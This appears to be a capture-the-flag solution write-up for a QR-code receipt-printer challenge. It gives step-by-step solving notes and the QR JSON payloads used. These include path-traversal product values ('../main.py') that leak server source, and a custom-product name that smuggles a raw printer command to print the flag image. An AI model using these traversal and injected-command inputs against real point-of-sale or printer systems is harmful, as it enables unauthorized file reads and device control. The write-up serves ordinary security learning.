# Solve

1. Scan provided QR codes
2. Realize that `pomes/apple` is a path
3. Replace path with `..`
4. Try with `../main.py`
5. Read source code from receipt
6. Find USB vendor ID (`0x1504`) and product ID (`0x0103`) to be from [`Bixolon Co., Ltd.`](https://the-sz.com/products/usbid/index.php?v=0x1504&p=0x0103&n=)
7. Find [datasheet for printer](https://www.bixolon.com/_upload/manual/Manual_BK3-3_Command_ENG_V1.03.pdf)
8. Find that the source code uses the flag on the line `send_printer_data(b"\x1cq\x012\x00}\x00" + flag_data)`
9. Find `0x1C q` to be command [`Define NV bit image`](https://www.bixolon.com/_upload/manual/Manual_BK3-3_Command_ENG_V1.03.pdf#%5B%7B%22num%22%3A110%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C436%2C551%2C0%5D)
10. Find command [`Print NV bit image`](https://www.bixolon.com/_upload/manual/Manual_BK3-3_Command_ENG_V1.03.pdf#%5B%7B%22num%22%3A107%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C436%2C551%2C0%5D) to be `0x1C p`
11. Find that `admin_custom_product` lets us print arbitrary commands to the printer
12. Craft JSON custom product `{"type":"admin_custom_product","product":{"name":"\u001cp\u0001\u0000","cost":1.0}}`
13. Make custom product into QR code, scan, and scan `Complete order`
14. Read flag from printed receipt

---

# Some QR codes

## Flag

```json
{"type":"admin_custom_product","product":{"name":"\u001cp\u0001\u0000","cost":1.0}}
```

## Products

```json
{"type":"select_product","product":"pomes/apple"}
{"type":"select_product","product":"berries/banana"}
{"type":"select_product","product":"berries/tomato"}
```

## Complete order

```json
{"type":"complete_order"}
```

## Solution steps

```json
{"type":"select_product","product":"."}
{"type":"select_product","product":".."}
{"type":"select_product","product":"../main.py"}
```
